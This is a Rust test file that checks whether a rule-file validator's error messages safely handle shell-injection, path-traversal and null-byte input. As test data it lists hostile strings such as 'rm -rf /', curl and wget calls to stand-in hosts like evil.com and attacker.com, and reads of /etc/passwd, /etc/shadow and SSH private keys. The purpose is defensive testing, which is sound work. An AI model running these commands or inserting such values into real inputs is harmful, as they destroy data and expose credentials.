/// Security tests for command injection vulnerabilities in validation error output
use std::fs;

#[test]
fn test_malicious_file_path_in_errors() {
    // Test that malicious file paths don't create injectable error messages
    let dangerous_paths = vec![
        "; rm -rf /",
        "$(whoami)",
        "`id`",
        "| cat /etc/passwd",
        "& curl attacker.com",
        "\n/bin/bash",
        "../../../etc/passwd",
    ];

    for path in dangerous_paths {
        // Validation should fail safely
        let result = validate_file_safely(path);

        // Error message should not contain unescaped dangerous characters
        if let Err(errors) = result {
            for error in errors {
                // Check that error messages don't have active shell metacharacters
                assert!(
                    !contains_active_shell_metachar(&error),
                    "Error message contains dangerous characters: {}",
                    error
                );

                // Verify path is quoted or escaped in error message
                if error.contains(path) {
                    println!("Warning: Error includes dangerous path: {}", error);
                }
            }
        }
    }
}

#[test]
fn test_malicious_rule_names() {
    // Create TOML with malicious rule names
    let malicious_names = vec![
        "; touch /tmp/pwned",
        "$(curl http://evil.com)",
        "`wget http://attacker.com/malware`",
        "test'; DROP TABLE rules; --",
        "../../../etc/shadow",
        "\\x00injection",
        "\n/bin/sh",
    ];

    for name in malicious_names {
        let toml = format!(
            r#"
[[rules]]
name = "{}"
type = "keyword"
# Missing required fields to trigger validation errors
        "#,
            name.replace('"', r#"\""#)
        );

        let test_file = format!("test_injection_{}.toml", rand_string());
        fs::write(&test_file, toml).unwrap();

        let result = validate_file_safely(&test_file);

        // Clean up
        fs::remove_file(&test_file).ok();

        if let Err(errors) = result {
            for error in &errors {
                // Error should mention the rule but not execute anything
                assert!(
                    !contains_active_shell_metachar(error),
                    "Error contains active shell metachar: {}",
                    error
                );

                // Error should not have unescaped quotes that could break quoting
                assert!(
                    !has_quote_injection(error),
                    "Error has quote injection vulnerability: {}",
                    error
                );
            }
            println!("✓ Safely handled malicious rule name: {:?}", name);
        }
    }
}

#[test]
fn test_malicious_regex_patterns() {
    // Test regex patterns with injection attempts
    let malicious_patterns = vec![
        r#".*"; touch /tmp/owned; echo ""#,
        r#".*`/bin/bash`.*"#,
        r#".*$(curl evil.com).*"#,
        r#".*\x00../../../etc/passwd"#,
    ];

    for pattern in malicious_patterns {
        let toml = format!(
            r#"
[[rules]]
name = "injection_test"
type = "regex"
field = "description"
pattern = "{}"
risk_score = 50
description = "Test"
        "#,
            pattern.replace('"', r#"\""#).replace('\\', r#"\\"#)
        );

        let test_file = format!("test_pattern_{}.toml", rand_string());
        fs::write(&test_file, &toml).unwrap();

        let result = validate_file_safely(&test_file);

        // Clean up
        fs::remove_file(&test_file).ok();

        if let Err(errors) = result {
            for error in &errors {
                // Verify pattern in error message is safe
                assert!(
                    !contains_active_shell_metachar(error),
                    "Pattern error contains shell metachar: {}",
                    error
                );
            }
        }
    }
}

#[test]
fn test_toml_syntax_error_messages() {
    // Test that TOML parse errors don't reflect malicious input unsafely
    let malicious_toml = r#"
[[rules]]
name = "$(whoami) injection"
type = "; /bin/bash"
evil = `curl http://attacker.com`
    "#;

    let test_file = "test_toml_injection.toml";
    fs::write(test_file, malicious_toml).unwrap();

    let result = validate_file_safely(test_file);

    // Clean up
    fs::remove_file(test_file).ok();

    // Even if parsing fails, error messages should be safe
    match result {
        Err(errors) => {
            for error in &errors {
                assert!(
                    !contains_active_shell_metachar(error),
                    "TOML error contains dangerous chars: {}",
                    error
                );
            }
        }
        Ok(_) => {
            // If it parsed, that's fine - just checking error handling
        }
    }
}

#[test]
fn test_error_message_format_safety() {
    // Verify that validation errors are formatted safely
    let test_cases = vec![
        (
            "Missing field with ; injection",
            "field\"; touch /tmp/pwned; echo \"",
        ),
        ("Backtick injection", "`whoami`"),
        ("Command substitution", "$(id)"),
        ("Pipe injection", "| cat /etc/passwd"),
        ("Newline injection", "test\n/bin/bash\n"),
    ];

    for (test_name, dangerous_value) in test_cases {
        let toml = format!(
            r#"
[[rules]]
name = "test"
type = "metadata"
field = "{}"
check = "is_none"
risk_score = 50
description = "Test"
        "#,
            dangerous_value.replace('"', r#"\""#)
        );

        let test_file = format!("test_format_{}.toml", rand_string());
        fs::write(&test_file, toml).unwrap();

        let result = validate_file_safely(&test_file);

        fs::remove_file(&test_file).ok();

        if let Err(errors) = result {
            for error in &errors {
                // Check error message structure is safe
                assert!(
                    !error.contains("`;"),
                    "{}: Error has backtick-semicolon sequence: {}",
                    test_name,
                    error
                );
                assert!(
                    !error.contains("&&"),
                    "{}: Error has && sequence: {}",
                    test_name,
                    error
                );
                assert!(
                    !error.contains("||"),
                    "{}: Error has || sequence: {}",
                    test_name,
                    error
                );
            }
        }
    }
}

#[test]
fn test_path_traversal_in_file_path() {
    // Test path traversal attempts in file paths
    let traversal_paths = vec![
        "../../../etc/passwd",
        "..\\..\\..\\windows\\system32\\config\\sam",
        "/etc/passwd",
        "../../../../root/.ssh/id_rsa",
    ];

    for path in traversal_paths {
        let result = validate_file_safely(path);

        // Should fail (file doesn't exist) but error should be safe
        assert!(result.is_err(), "Should fail for path: {}", path);

        if let Err(errors) = result {
            for error in &errors {
                // Debug: print actual error
                println!("Path: {}, Error: {}", path, error);

                // Error should mention failure (either file read or TOML parsing)
                // Some paths might exist (like /etc/passwd) and fail TOML parsing instead
                assert!(
                    error.contains("Failed to read") || error.contains("Invalid TOML"),
                    "Expected failure error for: {}. Got: {}",
                    path,
                    error
                );

                // Path in error should not break out of quotes
                assert!(
                    !has_path_traversal_risk(error),
                    "Error has path traversal risk: {}",
                    error
                );
            }
        }
    }
}

#[test]
fn test_null_byte_injection() {
    // Test null byte injection attempts
    let null_byte_cases = vec!["test\0.toml", "rules\x00.toml", "injection\0; rm -rf /"];

    for path in null_byte_cases {
        let result = validate_file_safely(path);

        if let Err(errors) = result {
            for error in &errors {
                // Null bytes should not appear in error messages
                assert!(!error.contains('\0'), "Error contains null byte");
                assert!(!error.contains("\\x00"), "Error contains null byte escape");
            }
        }
    }
}

// Helper functions

fn validate_file_safely(path: &str) -> Result<(), Vec<String>> {
    // Call the actual validation function from the library
    clu::analysis::heuristics::validate_heuristics_file(path)
}

fn contains_active_shell_metachar(s: &str) -> bool {
    // Check for dangerous shell metacharacters that could be active
    let dangerous = [
        "`;", "`", "$(", "${", "&&", "||", "|", "&", ";", "\n/", "'\n", "\"\n",
    ];

    dangerous.iter().any(|d| s.contains(d))
}

fn has_quote_injection(s: &str) -> bool {
    // Check for quote injection patterns
    // Single quote that's not escaped
    if s.contains("'; ") || s.contains("'&&") || s.contains("'||") {
        return true;
    }

    // Double quote followed by shell metachar
    if s.contains("\"; ") || s.contains("\"&&") || s.contains("\"||") {
        return true;
    }

    false
}

fn has_path_traversal_risk(s: &str) -> bool {
    // Check if error message could enable path traversal
    // This is more about information disclosure than injection

    // Multiple ../ sequences are suspicious
    s.matches("../").count() > 2 || s.matches("..\\").count() > 2
}

fn rand_string() -> String {
    use std::time::{SystemTime, UNIX_EPOCH};
    let timestamp = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_nanos();
    format!("{}", timestamp)
}
